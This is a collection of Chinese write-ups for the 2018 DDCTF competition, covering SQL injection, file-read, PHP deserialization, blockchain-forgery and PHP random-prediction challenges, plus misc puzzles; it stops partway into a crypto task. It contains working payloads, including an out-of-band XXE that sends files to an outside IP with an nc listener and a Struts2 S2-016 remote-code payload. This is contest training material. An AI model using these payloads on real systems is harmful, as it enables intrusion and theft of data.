# 2018DDCTF滴滴高校闯关赛

## 题目类型：

|类型|年份|难度|
|:---:|:---:|:---:|
|官方赛事题|2018|中|

# 网上公开WP：

+ https://impakho.com/post/ddctf-2018-writeup
+ http://blog.5am3.com/2018/04/24/ddctf2018/
+ https://www.jianshu.com/p/e6b66c27bdfd
+ https://www.anquanke.com/post/id/144879
+ http://www.leadroyal.cn/?p=466
+ https://www.anquanke.com/post/id/145553

# 题目下载:

+ Android题目文件下载 ：https://github.com/LeadroyaL/attachment_repo/tree/master/didictf_2018

# 本站备份WP：
**感谢作者：奈沙夜影、5am3、LeadroyaL、impakho** 

## WEB
感谢**5am3**师傅 ！
### 数据库的秘密

>[注意] 本次DDCTF所有WEB题无需使用也禁止使用扫描器
http://116.85.43.88:8080/JYDJAYLYIPHCJMOQ/dfe3ia/index.php


打开后会发现返回如下。

>非法链接，只允许来自 123.232.23.245 的访问

此时可以通过修改HTTP请求头中的X-Forwarded-For即可。即添加以下字段
```html
X-Forwarded-For:123.232.23.245
```
在这里，我用的是火狐的一个插件Modify Header Value (HTTP Headers)。

![](https://i.loli.net/2019/04/26/5cc2b6ad04447.png)

发现该网页是一个简单的查询列表。再加上题目中给的hint。可以判断为SQL注入题目。

经过测试，发现以上三个点均不是注入点。此时分析数据包，可以发现存在第四个注入点。

![](https://i.loli.net/2019/04/26/5cc2b6c664a0a.png)

然后查看源码，发现一个隐藏字段。经过测试发现，该字段可以注入。
```mysql
admin' && '1'='1'#
admin' && '1'='2'#
```
尝试注入 author，可以发现以下内容信息

+ and （可以用&&代替）
+ union select （很迷，这两个不能同时出现，然而自己又找不到其他方式）
+ 仅允许#号注释

然后注入渣的自己就比较无奈了。。不会啊。只好祭出盲注大法了。经过尝试，最终构造以下payload可用。
```mysql
admin' && binary substr((select group_concat(SCHEMA_NAME) from information_schema.SCHEMATA),1,1) <'z' #
```
然后开始写脚本，此时遇到了一个问题。发现他有一个验证。为了check你中途是否修改数据，而加入的一个hash比对。

首先将你的准备传送的内容进行某种hash后变为sig字段，然后再将sig通过get请求一起发送过去。此时服务器端会将sig与你发送的内容的hash比对一下。此时可以减少抓包中途修改内容的可能性。

所以，为了省事，我选择直接将这个代码调用一下。

用python的execjs库，可以直接执行js代码。

最终跑起脚本，获取到`flag DDCTF{IKIDLHNZMKFUDEQE}`

![](https://i.loli.net/2019/04/26/5cc2b76bce747.png)

### 专属链接

题目：

>现在，你拿到了滴滴平台为你同学生成的专属登录链接，但是你能进一步拿到专属他的秘密flag么
提示1：虽然原网站跟本次CTF没有关系，原网站是www.xiaojukeji.com
注：题目采用springmvc+mybatis编写，链接至其他域名的链接与本次CTF无关，请不要攻击
http://116.85.48.102:5050/welcom/3fca5965sd7b7s4a71s88c7se658165a791e

解答：

首先打开网站，发现是滴滴的官网。。

此时发现所有连接几乎全部重定向到了滴滴官网。

无奈下查看元素。发现hint
```html
<!--/flag/testflag/yourflag-->
```
尝试访问，`http://116.85.48.102:5050/flag/testflag/yourflag`发现报错500，好像是数组越界？

此时尝试将`yourflag`替换为`DDCTF{1321}`，返回`failed!!!`。

猜测爆破`flag`么？完全没戏啊。看样子应该有其他地方可以入手。

然而又发现了主页`js`的一句神奇的话。一个`ajax`语句。

![](https://i.loli.net/2019/04/26/5cc2b77f0104c.png)

然并卵，404。。。。。

此时只好继续分析题目，发现了令人眼前一亮的东西。对，就是下面这个`icon`。

![](https://i.loli.net/2019/04/26/5cc2b78faadbe.png)

```
http://116.85.48.102:5050/image/banner/ZmF2aWNvbi5pY28=
```

访问后，发现下载了`favicon.ico`

此时发现图标好像图片很奇怪。后来果然验证了这是个`hint`。

![](https://i.loli.net/2019/04/26/5cc2b7ac8246d.png)

此时可以愉快地玩耍了，这样一来，题目源码有了，还愁拿不下来么。

美滋滋。此时也知道了题目中`hint`的用意。题目采用`springmvc+mybatis`编写

百度搜索`springmvc+mybatis`文件结构，美滋滋读文件。

首先，大概知道了资源文件都是在`WEB-INF`文件夹下，所以猜测这个`icon`也在这里，此时我们要先确定文件夹。

`WEB-INF`下有一个`web.xml`，此时尝试读取，最终确定目录`../../WEB-INF/web.xml`。

然后拖文件。这里说几点注意事项。


+ 通过../../WEB-INF/web.xml确认位置。
+ 继续根据web.xml中的内容进行文件读取。classpath是WEB-INF/classes
+ 读class文件时根据包名判断文件目录com.didichuxing.ctf.listener.InitListener 即为WEB-INF/com/didichuxing/ctf/listener/InitListener.class
+ 制造网站报错，进一步找到更多的文件


差不多，注意一上四点，就可以拿到尽量多的源码了。

拖到源码后，就不美滋滋了。。。还好去年在DDCTF学过2017第二题的安卓逆向，会逆向了。

（此时坑点：jd-jui仅可逆jar，需要将class打成压缩包改为jar再逆向）

此时开始苦逼的分析源码。

分析后发现，存在接口，用当前用户的邮箱去生成一个flag。

但是flag是加密的。此时加密流程代码里都有，是一个RSA加密。密钥在服务器中的

![](https://i.loli.net/2019/04/26/5cc2b7ba36700.png)

此时又一次明白了，为什么读文件允许ks文件。

来吧，首先先拿邮箱申请一个flag

然而此时申请flag，邮箱也得先加密。自己提取出来的加密脚本如下。

```c++
public static String byte2hex(byte[] b)
  {
    StringBuilder hs = new StringBuilder();
    for (int n = 0; (b != null) && (n < b.length); n++)
    {
      String stmp = Integer.toHexString(b[n] & 0xFF);
      if (stmp.length() == 1) {
        hs.append('0');
      }
      hs.append(stmp);
    }
    return hs.toString().toUpperCase();
  }
  public static void getEmail() throws NoSuchAlgorithmException, InvalidKeyException{
	  SecretKeySpec signingKey = new SecretKeySpec("sdl welcome you !".getBytes(), "HmacSHA256");
	  Mac mac = Mac.getInstance("HmacSHA256");
      mac.init(signingKey);
	  String email="3113936212117314317@didichuxing.com";
	  byte[] e = mac.doFinal(String.valueOf(email.trim()).getBytes());
	  System.out.println(byte2hex(e));
  }
//0DFEE0968F44107479B6CF5784641060DB42952C197C7E8560C2B5F58925FAF4
```

坑：但是此时后端仅允许post方式。且参数是以get传递的。

成功获取到flag

>Encrypted flag : 506920534F89FA62C1125AABE3462F49073AB9F5C2254895534600A9242B8F18D4E420419534118D8CF9C20D07825C4797AF1A169CA83F934EF508F617C300B04242BEEA14AA4BB0F4887494703F6F50E1873708A0FE4C87AC99153DD02EEF7F9906DE120F5895DA7AD134745E032F15D253F1E4DDD6E4BC67CD0CD2314BA32660AB873B3FF067D1F3FF219C21A8B5A67246D9AE5E9437DBDD4E7FAACBA748F58FC059F662D2554AB6377D581F03E4C85BBD8D67AC6626065E2C950B9E7FBE2AEA3071DC0904455375C66A2A3F8FF4691D0C4D76347083A1E596265080FEB30816C522C6BFEA41262240A71CDBA4C02DB4AFD46C7380E2A19B08231397D099FE

然后，解密吧。。

只能百度了，java又不熟，RSA更不熟，尤其还是这种hex的。逆源码都失败了。一个劲报错。（查百度，好像是因为啥空格之类的。打不过打不过）

最终发现一个好玩的，可以从keystore提取RSA私钥。这样一来，又继续美滋滋。

https://blog.csdn.net/zbuger/article/details/51690900

然后照猫画虎，提出私钥。此时祭出自己的一个无敌大件。之前从某次CTF安卓题提出的RSA解密脚本。（当时题目简单，加解密都给了，改个函数名就ok了。）

(╯°□°）╯︵ ┻━┻

要不是在线的解不了。才不会想起这个大招（已放到附件，记得将 密文to ascii 再 to base64。）。。。。。

通过在线工具，提取出公私钥，然后跑脚本。最终拿到flag。

`DDCTF{1797193649441981961}`

###  注入的奥妙

题目：

>本题flag不需要包含DDCTF{}，为[0-9a-f]+
http://116.85.48.105:5033/4eaee5db-2304-4d6d-aa9c-962051d99a41/well/getmessage/1

解答：

按照题目要求，这题应该是个注入题，毫无疑问。

查看源码，发现给了big5的编码表，此时猜测可以通过宽字节进行注入。

```mysql
1餐' and 1=1%23
```

orderby，发现有三个字段，尝试构造联合查询语句，发现union会被直接删除。此时双写绕过即可。

此时查询数据库：
```mysql
1餐' uniunionon select SCHEMA_NAME,2,3 from information_schema.SCHEMATA %23
```

![](https://i.loli.net/2019/04/26/5cc2b7d61e8fa.png)

然后继续查询表名：

```mysql
1餐' uniunionon select TABLE_NAME,2,3 from information_schema.tables where table_schema=sqli %23
```

此时发生了一件尴尬的事情。我们无法继续构造单双引号，这样数据库会报以下错误。

![](https://i.loli.net/2019/04/26/5cc2b7f433584.png)

此时祭出hex大法。数据库会直接将0x开头的进行转码解析。

```mysql
1餐' uniunionon select TABLE_NAME,2,3 from information_schema.tables where table_schema=0x73716c69 %23
```

此时成功的爆出来了三个表

```mysql
message,route_rules,users
```

然后就没啥好说的了。挨个查着玩就可以了，基本同上。然后查字段啥的。

查路由的时候，有点小坑，不知道后端怎么解析的，会将一列数据解析到多列，此时用mysql的to_base64()函数即可。

通过路由信息，我们可以发现存在`static/bootstrap/css/backup.css`源码泄露。

通过以下三行脚本即可保存该文件。

```python
import requests
f=open('a.zip','wb')
f.write(requests.get('http://116.85.48.105:5033/static/bootstrap/css/backup.css').content)
```

接下来就是对PHP代码的审计。

首先，分析路由。我们从数据表内知道了有以下几条规则

```
get/:u/well/getmessage/:s Well#getmessage
get/:u/justtry/self/:s JustTry#self
post*/:u/justtry/try JustTry#try
```

首先第一条，就是咱刚刚实现注入的那一个。不用多看，逻辑差不多清楚。

第二，三条，调用的都是justtry类下的某个方法。所以可以跟进去，重点分析下这个函数。

![](https://i.loli.net/2019/04/26/5cc2b8063b834.png)

此时看见了 unserialize ，倍感亲切，这不就是反序列化么。

此时就需要考虑反序列化了。他后面限制了几个类，此时我们可以一一打开分析。

test类，顾名思义，就是一个测试用的。

![](https://i.loli.net/2019/04/26/5cc2b846aed1b.png)

此时我们发现他的析构函数中，有一条特殊的句子。跟进去之后发现，他会将falg打印出来。

仔细分析源码后发现，这个test类通过调用Flag类来获取flag，然而Flag类又需要调用SQL类来进行数据库查询。

所以，这个反序列化是个相当大的工程。自己手写是无望了。

首先尝试了一下，自己写三个类的调用。。。然而失败了。

最后复现源码，并在try方法打印序列化对象后。（uuid是你的url那串，uuid类下正则可以看出来。）

![](https://i.loli.net/2019/04/26/5cc2b86d6ea4a.png)

发现，他是有一个命名空间的要求。序列化后语句如下

```
O:17:"Index\Helper\Test":2:{s:9:"user_uuid";s:36:"4eaee5db-2304-4d6d-aa9c-962051d99a41";s:2:"fl";O:17:"Index\Helper\Flag":1:{s:3:"sql";O:16:"Index\Helper\SQL":2:{s:3:"dbc";N;s:3:"pdo";N;}}}
```

最终的Payload如下：

```
url:http://116.85.48.105:5033/4eaee5db-2304-4d6d-aa9c-962051d99a41/justtry/try/
postdata:
serialize=%4f%3a%31%37%3a%22%49%6e%64%65%78%5c%48%65%6c%70%65%72%5c%54%65%73%74%22%3a%32%3a%7b%73%3a%39%3a%22%75%73%65%72%5f%75%75%69%64%22%3b%73%3a%33%36%3a%22%34%65%61%65%65%35%64%62%2d%32%33%30%34%2d%34%64%36%64%2d%61%61%39%63%2d%39%36%32%30%35%31%64%39%39%61%34%31%22%3b%73%3a%32%3a%22%66%6c%22%3b%4f%3a%31%37%3a%22%49%6e%64%65%78%5c%48%65%6c%70%65%72%5c%46%6c%61%67%22%3a%31%3a%7b%73%3a%33%3a%22%73%71%6c%22%3b%4f%3a%31%36%3a%22%49%6e%64%65%78%5c%48%65%6c%70%65%72%5c%53%51%4c%22%3a%32%3a%7b%73%3a%33%3a%22%64%62%63%22%3b%4e%3b%73%3a%33%3a%22%70%64%6f%22%3b%4e%3b%7d%7d%7d
```

### mini blockchain

题目 ：

>某银行利用区块链技术，发明了DiDiCoins记账系统。某宝石商店采用了这一方式来完成钻石的销售与清算过程。不幸的是，该银行被黑客入侵，私钥被窃取，维持区块链正常运转的矿机也全部宕机。现在，你能追回所有DDCoins，并且从商店购买2颗钻石么？
注意事项：区块链是存在cookie里的，可能会因为区块链太长，浏览器不接受服务器返回的set-cookie字段而导致区块链无法更新，因此强烈推荐写脚本发请求
题目入口：
http://116.85.48.107:5000/b942f830cf97e


解答 ：

拿到题目，内心是拒绝的。因为虽然说区块链这么火，但是自己还是没怎么了解过。

第一反应是。药丸，没戏了。但是，搞信息安全的孩子怎么可以轻言放弃呢！

时间辣么长，还不信看不明白个区块链。最后肛了两天多，才大概明白了题目

首先，题目给了源码，这个很棒棒。

建议大家分析题目时将代码也多读几遍，然后再结合参考资料进行理解。

在这里不做太多的理解源码的讲解。

最初我是将重心代码的一些逻辑上，以及加密是否可逆。（发现自己太年轻，看不懂）

然后慢慢的开始了解区块链，最后发现这种手段。

这道题目中，利用了区块链一个很神奇的东西。

因为区块链是一个链表，而且还是一个谁都可以增加的，此时，人们达成了一种默认，以最长的那条链为主链（正版），其他的分支都是盗版。

如下图，就是此时该题目的区块链。

![](https://i.loli.net/2019/04/26/5cc2b880cf72a.png)

那么我们可以再构造一条链，只要比主链长，那这条链就是我们说了算。

![](https://i.loli.net/2019/04/26/5cc2b894e8924.png)

此时虽然说区块链1是正规的链，但是区块链2要比1长，此时区块链2即为正规链。

但是，说的轻巧，我们该如何构造呢？

首先，我们分析路由可以发现，题目预留了一个创建交易的接口。此时可以生成新块。

![](https://i.loli.net/2019/04/26/5cc2b8a448fcc.png)

只要我们可以挖到一个DDcoin，就可以创建一次新块，然后会判断商店的余额。最终给予砖石奖励。

然而DDcoin是什么呢。

在这道题里，其实就是这个东西，这就是一个区块。对他进行分析一下。

![](https://i.loli.net/2019/04/26/5cc2b8b277e69.png)

```
nonce:自定义字符串
prev：上一个区块的地址
hash：这个区块的hash
height：当前处于第几个节点
transactions：交易信息
```

再分析transactions

```
input与signature好像是一个凭证，验证这个区块主人身份。
output，收款人信息
amount，收款数额
addr，收款地址
```

hash这里的话，不是太明白。

但是看代码。发现都有现成的可以生成。只要利用这三个函数，即可创建一个新的区块。

```
create_output_utxo(addr_to, amount) // 新建一个output信息
create_tx(input_utxo_ids, output_utxo, privkey_from=None) // 新建一个transactions信息
create_block(prev_block_hash, nonce_str, transactions) // 新建一个区块
```

首先新建output，此时参数很简单，收货人地址（商店），数量（全款）

然后创建tx，此时output_utxo就是刚刚咱创建好的那个。然而问题来了，私钥和id咱是没有的。此时分析代码可以发现，这一步做的主要就是创建一个sig签名。还有就是生成一个hash

![](https://i.loli.net/2019/04/26/5cc2b8c153754.png)

此时，邪恶的想到，既然是要创建第二条链，那么可不可以借用一下第一条链的第一块的信息。

也就是直接忽略掉sig的生成，伪造tx，直接重写一下create_tx

![](https://i.loli.net/2019/04/26/5cc2b8d0ad57b.png)

然后此时tx也有了，进行下一步create_block

此时他的三个参数也好写，上一个区块的hash，自定义字符串，刚刚做好的tx

此时，我们要通过爆破nonce的方式，来使create_block生成的块的hash为00000开头，

这样，我们才能添加。

然后向那个添加块的地址post由create_block即可成功添加第一个块。

记得改请求头中的content-type为json。还有就是cookie自己手动更新

第二个块的时候，问题又来了。

这条链中，我们之前的tx已经使用过一次，无法使用了。怎么办？

此时可以注意到题目中init中给的hint。

![](https://i.loli.net/2019/04/26/5cc2b9928c2fc.png)

凭啥他可以不写tx就生成块！不开心，你都能那样，我也要！

于是。。。。。通过这个方式，在后面添加几个空区块就好。

成功伪造主链！获取一颗砖石。

再次重复以上做法，完成第三条链即可获取到flag

切记，手动更新cookie……

###  我的博客

题目 ：
```
提示：www.tar.gz

http://116.85.39.110:5032/a8e794800ac5c088a73b6b9b38b38c8d
```

解答 ：

题目又给了源码，美滋滋。
然而下载到源码后就不美滋滋了。

一共给了三个页面，主页很明显，有一个SQL注入漏洞。这个题之前安恒杯三月见过。利用率printf函数的一个小漏洞，%1$’可以造成单引号逃逸。

然而，你是进不去主页的。因为。。

![](https://i.loli.net/2019/04/26/5cc2b99ea8be4.png)

还没进去，就被die了。

然后只好分析如何能成为admin了。此时看到了。

![](https://i.loli.net/2019/04/26/5cc2b9ae23346.png)

当你是通过邀请码注册的，你便可以成为admin。

然而，邀请码是完全随机的。

此时，想起LCTF的一道题，感觉完全一样有木有！

https://github.com/LCTF/LCTF2017/tree/master/src/web/%E8%90%8C%E8%90%8C%E5%93%92%E7%9A%84%E6%8A%A5%E5%90%8D%E7%B3%BB%E7%BB%9F

然而当时有两个解，一个非预期条件竞争，另一个正则的漏洞。

此时这题完全没用啊！当时要疯了，猜测，难道是要预测随机数？

![](https://i.loli.net/2019/04/26/5cc2b9bad81a4.png)

然而，当我看到大佬这句话的时候，萌生了放弃的想法，猜测肯定还有其他解法。

奈何，看啊看，看啊看，我瞪电脑，电脑瞪我。

最后还是决定看一下随机数这里。很开心，找到了这篇文章。

http://drops.xmd5.com/static/drops/web-11861.html

然而，每个卵用，他只告诉了我：对！毛病就在随机数，但是你会么？

满满的都是嘲讽….

来吧，一起看，首先这篇文章讲了一种后门的隐藏方式，话说我读了好几遍才理解。

然后不得不感叹，作者….你还是人么。这都能想出来。服！真的服！

首先，大家需要先知道rand()是不安全的随机数。（然而我不知道）

然后str_shuffle()是调用rand()实现的随机。所以此时重点是。如何预测rand？

然而作者没告诉，给的链接都是数学，看不懂…..

此时PHITHON大佬的这篇文章真的是解救了自己。

https://www.leavesongs.com/penetration/safeboxs-secret.html

![](https://i.loli.net/2019/04/26/5cc2b9c7260f8.png)

所以，此时我们知道了一件事情。当我们可以获取到连续的33个随机数后，我们就可以预测后面连续的所有随机数。

如何连续？大佬文章中说了，通过http请求头中的Connection:Keep-Alive。

此时，我们先获取他100个随机数。

```
s = requests.Session()
url='http://116.85.39.110:5032/a8e794800ac5c088a73b6b9b38b38c8d/register.php'
headers={'Connection': 'Keep-Alive'}
state=[]
for i in range(50):
		r=s.get(url,headers=headers)
		state.append(int(re.search(r'id="csrf" value="(.+?)" required>', r.text, re.M|re.I).group(1)))
```

然后测试一下

```
yuce_list=[]
for i in range(10):
	yuceTemp=yuce(len(state))
	state.append(yuceTemp)
	yuce_list.append(yuceTemp)
```

此时发现和实际是有一些冲突的。分析后发现，应该将生成的随机数取余2`147483647`才是真正的数。

但此时又有了一个问题。

![](https://i.loli.net/2019/04/26/5cc2b9e8620d5.png)

之前大佬是说过会有一定的误差，但是误差率太高了。虽然误差不大，但是….

此时，没办法，只能祈求后面会处理误差。此时我们完成了随机数的预测。

接下来需要写如何打乱字符串。

可以发现，一个很简单的流程，生成随机数，然后交换位置。

![](https://i.loli.net/2019/04/26/5cc2b9f429d7b.png)

唯一不知道的地方就是其中这个地方的一个函数。

此时直接去GitHub翻一下源码。

https://github.com/jinjiajin/php-5.6.9/blob/35e92f1f88b176d64f1d8fc983e466df383ee34e/ext/standard/php_rand.h

![](https://i.loli.net/2019/04/26/5cc2ba0b21e6b.png)

然后就是愉快的重写代码。

```
def rand_range(rand,minN,maxN,tmax=2147483647):
	temp1=tmax+1.0
	temp2=rand/temp1
	temp3=maxN-minN
	temp4=temp3+1.0
	temp5=temp4*temp2
	rand=minN+(int)(temp5)
	return rand
admin_old=['0','1','2','3','4','5','6','7','8','9','a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p','q','r','s','t','u','v','w','x','y','z','A','B','C','D','E','F','G','H','I','J','K','L','M','N','O','P','Q','R','S','T','U','V','W','X','Y','Z']
for i in range(len(admin_old))[::-1]:
	a=rand_range(int(yuce_list[len(admin_old)-i-1]),0,i)
	admin_old[i],admin_old[a]=admin_old[a],admin_old[i]
key=''
for i in admin_old:
	key+=i
print(key)
```

此时就可以愉快的生成随机数了。然后在进行一下注册。此时csrf记得提前在获取state时保存一下最后一位。

```
def getAdmin(username,passwd,code):
	data={
		"csrf":csrf,
		"username":username,
		"password":passwd,
		"code":code
	}
	r=s.post(url,headers=headers,data=data)
	print(r.text)
```

切记！code是：admin###开头，后面截取32位！

最后用拿到的账号进行登录即可。

后面就是sql注入了。很简单，只要单引号逃逸后，就可以显注了。没有其他过滤

```
/a8e794800ac5c088a73b6b9b38b38c8d/index.php?id=1&title=-1%1$'+union+select+1,f14g,3+from+a8e79480.key+where+1+%23
```
![](https://i.loli.net/2019/04/26/5cc2ba1d1f545.png)

### 喝杯Java冷静下

题目：

题目环境：[Quick4j](https://github.com/Eliteams/quick4j/)

解答：

查看网页源代码，找到登录的用户名和密码（admin: admin_password_2333_caicaikan）

```
Line 87: <!-- YWRtaW46IGFkbWluX3Bhc3N3b3JkXzIzMzNfY2FpY2Fpa2Fu -->
```

登录进去发现跟 Web2 差不多，也是 任意文件下载漏洞。

对比 Github 上 Quick4j 的源代码文件路径，把所有代码文件对应的下载下来，与原来的代码进行比较。

找到关键文件，进行反编译：
`/rest/user/getInfomation?filename=WEB-INF/classes/com/eliteams/quick4j/web/security/SecurityRealm.class`

```
    if ((username.equals("superadmin_hahaha_2333")) && (password.hashCode() == 0))
    {
      String wonderful = "you are wonderful,boy~";
      System.err.println(wonderful);
    }
```

找到超级管理员用户名和密码（superadmin_hahaha_2333: f5a5a608）

`/rest/user/getInfomation?filename=WEB-INF/classes/com/eliteams/quick4j/web/controller/UserController.class`
```
  @RequestMapping(value={"/nicaicaikan_url_23333_secret"}, produces={"text/html;charset=UTF-8"})
  @ResponseBody
  @RequiresRoles({"super_admin"})
```

这里以超级管理员身份，可以实现 XML 外部实体注入 漏洞。

但是这里的注入没有回显，那只能用反弹实现回显了。

服务器部署 `1.xml`：

```
<!ENTITY % all "<!ENTITY send SYSTEM 'http://222.125.86.10:23946/%file;'>">
```

服务器监听端口：`nc -l -p 23946`

Payload 示例：

```
<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE data [
<!ENTITY % file SYSTEM "">
<!ENTITY % dtd SYSTEM "http://222.125.86.10/1.xml">
%dtd; %all;
]>
<value>&send;</value>
```
读取 `/Flag/hint.txt` 文件：
```
/rest/user/nicaicaikan_url_23333_secret?xmlData=%3c%3fxml+version%3d%221.0%22+encoding%3d%22utf-8%22%3f%3e%3c!DOCTYPE+data+%5b%3c!ENTITY+%25+file+SYSTEM+%22file%3a%2f%2f%2fflag%2fhint.txt%22%3e%3c!ENTITY+%25+dtd+SYSTEM+%22http%3a%2f%2f222.125.86.10%2f1.xml%22%3e%25dtd%3b+%25all%3b%5d%3e%3cvalue%3e%26send%3b%3c%2fvalue%3e
```

![](https://i.loli.net/2019/04/26/5cc2c57261c26.png)

`Flag in intranet tomcat_2 server 8080 port.`

访问 `http://tomcat_2:8080/` ：
```
/rest/user/nicaicaikan_url_23333_secret?xmlData=%3c%3fxml+version%3d%221.0%22+encoding%3d%22utf-8%22%3f%3e%3c!DOCTYPE+data+%5b%3c!ENTITY+%25+file+SYSTEM+%22http%3a%2f%2ftomcat_2%3a8080%2f%22%3e%3c!ENTITY+%25+dtd+SYSTEM+%22http%3a%2f%2f222.125.86.10%2f1.xml%22%3e%25dtd%3b+%25all%3b%5d%3e%3cvalue%3e%26send%3b%3c%2fvalue%3e
```

![](https://i.loli.net/2019/04/26/5cc2c59010c98.png)

`try to visit hello.action.`

访问 http://tomcat_2:8080/hello.action ：
```
/rest/user/nicaicaikan_url_23333_secret?xmlData=%3c%3fxml+version%3d%221.0%22+encoding%3d%22utf-8%22%3f%3e%3c!DOCTYPE+data+%5b%3c!ENTITY+%25+file+SYSTEM+%22http%3a%2f%2ftomcat_2%3a8080%2fhello.action%22%3e%3c!ENTITY+%25+dtd+SYSTEM+%22http%3a%2f%2f222.125.86.10%2f1.xml%22%3e%25dtd%3b+%25all%3b%5d%3e%3cvalue%3e%26send%3b%3c%2fvalue%3e
```

![](https://i.loli.net/2019/04/26/5cc2c5a64116b.png)

`This is Struts2 Demo APP, try to read /flag/flag.txt.`
根据题目提示：第二层关卡应用版本号为 2.3.1
上网查了一下 `Struts2 2.3.1` 的 CVE ，发现 `Struts2 S2-016` 可用
直接贴上最终 Payload：
```
/rest/user/nicaicaikan_url_23333_secret?xmlData=%3c%3fxml+version%3d%221.0%22+encoding%3d%22utf-8%22%3f%3e%3c!DOCTYPE+data+%5b%3c!ENTITY+%25+file+SYSTEM+%22http%3a%2f%2ftomcat_2%3a8080%2fhello.action%3fredirect%253a%2524%257b%2523a%253dnew%2bjava.io.FileInputStream(%2527%252fflag%252fflag.txt%2527)%252c%2523b%253dnew%2bjava.io.InputStreamReader(%2523a)%252c%2523c%253dnew%2bjava.io.BufferedReader(%2523b)%252c%2523d%253dnew%2bchar%255b60%255d%252c%2523c.read(%2523d)%252c%2523matt%253d%2523context.get(%2527com.opensymphony.xwork2.dispatcher.HttpServletResponse%2527).getWriter()%252c%2523matt.println(%2523d)%252c%2523matt.flush()%252c%2523matt.close()%257d%22%3e%3c!ENTITY+%25+dtd+SYSTEM+%22http%3a%2f%2f222.125.86.10%2f1.xml%22%3e%25dtd%3b+%25all%3b%5d%3e%3cvalue%3e%26send%3b%3c%2fvalue%3e
```

![](https://i.loli.net/2019/04/26/5cc2c5b92cba9.png)

Flag: `DDCTF{You_Got_it_WonDe2fUl_Man_ha2333_CQjXiolS2jqUbYIbtrOb}`

## MISC
**作者：5am3、impakho**
### 签到题 

题目 ：

>请点击按钮下载附件

解答 ：

出题人是真的皮。下载后会发现一个神奇的东西。flag.txt里面的内容是这个
```
请查看赛题上方“公告”页
```
然后打开公告页，发现了他。。
```
DDCTF{echo”W3Lc0me_2_DiD1${PAAMAYIM_NEKUDOTAYIM}C7f!”}
```
好歹咱也是个web手。so …..
本来还以为要解开里面的PHP代码。自己误以为是这个。
```
DDCTF{W3Lc0me_2_DiD1::C7f!"}
```
最后发现，原来是真·签到题。

###  (╯°□°）╯︵ ┻━┻ 

题目 ：
```
(╯°□°）╯︵ ┻━┻
d4e8e1f4a0f7e1f3a0e6e1f3f4a1a0d4e8e5a0e6ece1e7a0e9f3baa0c4c4c3d4c6fbb9b2b2e1e2b9b9b7b4e1b4b7e3e4b3b2b2e3e6b4b3e2b5b0b6b1b0e6e1e5e1b5fd
```
解答 ：

这道题蛮坑的。。想了无数种密码后都没思路。最后只能老老实实研究，或许是一些简单的编码？
一共134个字符。尝试2位一组，转化为十进制后，发现数值在一定范围内浮动。

![](https://i.loli.net/2019/04/26/5cc2ba2fe3ad1.png)

然后考虑到ascii码可见区域，于是尝试对其进行取余128的操作。
最后发现余数均在ascii码的可见区域。之后hex2ascii 即可获取到flag。
```
a=[212,232,225,244,160,247,225,243,160,230,225,243,244,161,160,212,232,229,160,230,236,225,231,160,233,243,186,160,196,196,195,212,198,251,185,178,178,225,226,185,185,183,180,225,180,183,227,228,179,178,178,227,230,180,179,226,181,176,182,177,176,230,225,229,225,181,253]
b=''
for i in a:
	b+=chr(i%128)
print(b)
```

![](https://i.loli.net/2019/04/26/5cc2ba5146707.png)

```
DDCTF{922ab9974a47cd322cf43b50610faea5}
```

### 第四扩展FS 

```
D公司正在调查一起内部数据泄露事件，锁定嫌疑人小明，取证人员从小明手机中获取了一张图片引起了怀疑。这是一道送分题，提示已经在题目里，日常违规审计中频次有时候非常重要。
```

拿到图片，发现大小出奇的大，于是尝试binwalk，提出来一个压缩包。

![](https://i.loli.net/2019/04/26/5cc2ba62f14bb.png)

尝试打开，发现是有密码的。（这里有个技巧，个人比较喜欢用windows的好压解压缩软件，这个软件存在一定的压缩包修复。）
然后回到题目，仔细分析。尝试无果后，最终将密码锁定在了提示已经在题目里，所以尝试查看文件属性，发现了一些奇怪的字符串。

![](https://i.loli.net/2019/04/26/5cc2ba7c932c3.png)

一般来说，图片信息中不会出现备注的。所以尝试将其作为密码解压，解压成功。
然后发现了一串稀奇古怪的。。。。字符。

![](https://i.loli.net/2019/04/26/5cc2ba89ae8a4.png)

此时想到了题目中给的hint：`日常违规审计中频次有时候非常重要`

尝试词频统计。得到flag

![](https://i.loli.net/2019/04/26/5cc2baa7c4b51.png)

此时有一点小小坑。。D是两个。。
flag ：DDCTF{x1n9shaNgbIci}

### 流量分析

题目 ：

```
提示一：若感觉在中间某个容易出错的步骤，若有需要检验是否正确时，可以比较MD5: 90c490781f9c320cd1ba671fcb112d1c
提示二：注意补齐私钥格式
—–BEGIN RSA PRIVATE KEY—–
XXXXXXX
—–END RSA PRIVATE KEY—–
```

解答 ：

怎么说呢，做完这题，我才知道坑人能有多坑！
流量分析的题，首先可以发现他的大小很小。不像是那种大流量的分析。
尝试了一下学长之前推荐的一款工具《科来网络分析系统》

![](https://i.loli.net/2019/04/26/5cc2bab3c095a.png)

可以发现ftp传输了两个包。此时，fl-g极有可能是flag。

于是拿wireshark千辛万苦，提取出来压缩包。然而….没有密码。
只好继续分析了。因为毕竟misc4了，不可能是密码爆破啥的吧。

继续看， 发现一个邮件（不知道科来怎么提文件，查看数据。哭唧唧）
wireshark导出IMF对象。可以发现导出了几个邮件。然后逐个分析。

然而并没卵用，唯一有点用的，感觉奇怪的，就只有一个邮件。

![](https://i.loli.net/2019/04/26/5cc2bac4038d6.png)

此时这个不是一点的奇怪！而是很奇怪！那么，这串密钥。。是干什么的呢。
经过老司机多年开车经验，呸。做题经验。

猜测！肯定有https流量。当然，科来也说有了。

![](https://i.loli.net/2019/04/26/5cc2bae36cad0.png)

于是。。这种之前曾听说过的题目，现在到了手里还是有些小激动的。
尤其是那个图片！图片！图片！！！！

ocr也不行，手写也不行。那么多字。心塞ing。
好吧，最后还是百度找了个ocr识别了一下，然后改了几个字符。。

然后就是解密https流量。具体可以看这个链接。
https://blog.csdn.net/kelsel/article/details/52758192

直接导入私钥就可以。这里需要按照hint格式来，在前后加上标志位。
然后就可以解密https流量了。

然后搜索ssl，追踪http流量，最后取得flag

![](https://i.loli.net/2019/04/26/5cc2baedcda2c.png)

### 安全通信

感谢**impakho**师傅！

题目：
```
#!/usr/bin/env python
import sys
import json
from Crypto.Cipher import AES
from Crypto import Random

def get_padding(rawstr):
    remainder = len(rawstr) % 16
    if remainder != 0:
        return '\x00' * (16 - remainder)
    return ''

def aes_encrypt(key, plaintext):
    plaintext += get_padding(plaintext)
    aes = AES.new(key, AES.MODE_ECB)
    cipher_text = aes.encrypt(plaintext).encode('hex')
    return cipher_text

def generate_hello(key, name, flag):
